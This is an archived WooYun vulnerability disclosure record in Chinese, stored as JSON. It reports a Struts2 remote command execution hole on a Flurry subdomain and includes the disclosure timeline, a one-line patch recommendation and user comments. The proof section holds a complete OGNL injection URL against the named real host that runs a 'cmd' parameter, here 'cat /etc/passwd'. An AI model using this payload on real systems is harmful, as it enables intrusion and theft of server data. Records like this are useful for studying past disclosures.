{"id": 6229, "wybug_id": "wooyun-2013-046556", "wybug_title": "Flurry 移动应用统计公司Struts2远程命令执行", "wybug_corp": "Flurry", "wybug_author": "7z1", "wybug_date": "2013-12-20 17:41", "wybug_open_date": "2014-02-03 17:41", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["移动应用统计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-02-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Flurry 移动应用统计公司某分站存在Struts2远程命令执行。 详细说明：  本来是对国内某手机游戏抓包的，没想到把他给抓出来了。发现存在Struts2远程执行命令漏洞，搜下名气还不小~~\n\n通过该漏洞，可读取服务器中间件配置文件等敏感信息。   漏洞证明：  http://data.flurry.com//aas.do?%28%27\\43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27\\43context[\\%27xwork.MethodAccessor.denyMethodExecution\\%27]\\75false%27%29%28b%29%29&%28%27\\43c%27%29%28%28%27\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27\\43req\\75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28h%29%28%28%27\\43webRootzpro\\75@java.lang.Runtime@getRuntime%28%29.exec%28\\43req.getParameter%28%22cmd%22%29%29%27%29%28d%29%29&%28i%29%28%28%27\\43webRootzproreader\\75new\\40java.io.DataInputStream%28\\43webRootzpro.getInputStream%28%29%29%27%29%28d%29%29&%28i01%29%28%28%27\\43webStr\\75new\\40byte[51020]%27%29%28d%29%29&%28i1%29%28%28%27\\43webRootzproreader.readFully%28\\43webStr%29%27%29%28d%29%29&%28i111%29%28%28%27\\43webStr12\\75new\\40java.lang.String%28\\43webStr%29%27%29%28d%29%29&%28i2%29%28%28%27\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27\\43xman.getWriter%28%29.println%28\\43webStr12%29%27%29%28d%29%29&%28i99%29%28%28%27\\43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&cmd=cat+%2Fetc%2Fpasswd   修复方案：  访问官网更新补丁。   版权声明：转载请注明来源 7z1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-12-20 17:50 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  前排广告，收购wb。价格1：6    \n     2014-10-10 14:59 |    \t\t7z1 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:14        | 黑客：探险家、网络中的幽灵、用技术捍卫正...)\t\t \n  这漏洞居然还在。。。卧槽！    \n     2014-12-05 00:05 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  口袋战争的吧,世界真小，我找到了，没想到乌云一搜才发现有人已经提前找到了。    \n     2014-12-17 14:06 |    \t\t7z1 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:14        | 黑客：探险家、网络中的幽灵、用技术捍卫正...)\t\t \n  @Arthur  不止这个游戏，基本上ios 上80%游戏都会有这个公司的数据统计~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}